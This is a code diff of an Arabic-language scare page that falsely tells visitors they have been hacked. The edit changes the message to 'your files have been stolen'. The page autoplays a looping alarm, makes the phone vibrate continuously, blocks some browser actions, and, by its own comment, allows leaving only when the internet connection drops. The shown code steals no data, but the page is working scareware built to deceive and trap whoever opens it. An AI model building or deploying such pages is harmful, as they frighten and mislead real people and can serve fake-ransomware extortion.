@@ -1,69 +1,57 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>تم اختراقك⚠️</title>
+<title>تم سرقت ملفاتك⚠️🚫</title>
 <style>
   body {
     margin: 0;
     height: 100vh;
-    background: repeating-linear-gradient(
-      45deg,
-      #0f0,
-      #0f0 10px,
-      #060 10px,
-      #060 20px
+    background-color: #000;
+    background-image: repeating-linear-gradient(
+      0deg,
+      transparent,
+      transparent 10px,
+      #0f0 11px,
+      #0f0 12px
+    ), repeating-linear-gradient(
+      90deg,
+      transparent,
+      transparent 10px,
+      #0f0 11px,
+      #0f0 12px
     );
-    color: #00ff00;
-    font-family: Arial, sans-serif;
+    color: #0f0;
+    font-family: 'Courier New', Courier, monospace;
     display: flex;
     justify-content: center;
     align-items: center;
-    flex-direction: column;
     user-select: none;
     overflow: hidden;
+    flex-direction: column;
   }
   h1 {
     font-size: 4em;
-    text-shadow: 0 0 10px #0f0;
-    margin: 0;
-    animation: glitch 2s infinite;
+    text-shadow:
+      0 0 5px #0f0,
+      0 0 10px #0f0,
+      0 0 20px #0f0,
+      0 0 40px #0f0;
+    animation: flicker 2s infinite alternate;
   }
-  @keyframes glitch {
-    0% {
-      clip-path: polygon(0 2%, 100% 2%, 100% 5%, 0 5%);
-      transform: translate(2px, -2px);
-    }
-    20% {
-      clip-path: polygon(0 15%, 100% 15%, 100% 18%, 0 18%);
-      transform: translate(-2px, 2px);
-    }
-    40% {
-      clip-path: polygon(0 35%, 100% 35%, 100% 38%, 0 38%);
-      transform: translate(2px, 0);
-    }
-    60% {
-      clip-path: polygon(0 55%, 100% 55%, 100% 58%, 0 58%);
-      transform: translate(-2px, 0);
-    }
-    80% {
-      clip-path: polygon(0 75%, 100% 75%, 100% 78%, 0 78%);
-      transform: translate(0, 2px);
-    }
-    100% {
-      clip-path: polygon(0 2%, 100% 2%, 100% 5%, 0 5%);
-      transform: translate(2px, -2px);
-    }
+  @keyframes flicker {
+    0%, 100% {opacity: 1;}
+    50% {opacity: 0.6;}
   }
 </style>
 </head>
 <body>
-<h1>تم اختراقك⚠️</h1>
+<h1>تم سرقت ملفاتك⚠️🚫</h1>
 
 <audio id="alarm" autoplay loop>
-  <source src="https://actions.google.com/sounds/v1/alarms/alarm_clock.ogg" type="audio/ogg" />
-  <source src="https://actions.google.com/sounds/v1/alarms/alarm_clock.mp3" type="audio/mpeg" />
+  <source src="https://actions.google.com/sounds/v1/alarms/medium_bell_ring.ogg" type="audio/ogg" />
+  <source src="https://actions.google.com/sounds/v1/alarms/medium_bell_ring.mp3" type="audio/mpeg" />
 </audio>
 
 <script>
@@ -77,17 +65,15 @@
     e.preventDefault();
   });
 
-  // اهتزاز الهاتف كل ثانية مع تشغيل الصوت (إذا مدعوم)
+  // اهتزاز الهاتف مستمر (إذا مدعوم)
   function vibrate() {
     if (navigator.vibrate) {
-      navigator.vibrate(500); // اهتزاز لمدة 500 ملي ثانية
+      navigator.vibrate([500, 200, 500]);
     }
   }
+  setInterval(vibrate, 1500);
 
-  // استدعاء الاهتزاز كل ثانية (متزامن مع الصوت)
-  setInterval(vibrate, 1000);
-
-  // السماح بالخروج فقط عند انقطاع الإنترنت
+  // السماح بالخروج فقط عند انقطاع الإنترنت (تقريباً)
   function checkConnection() {
     if (!navigator.onLine) {
       window.location.href = "about:blank";
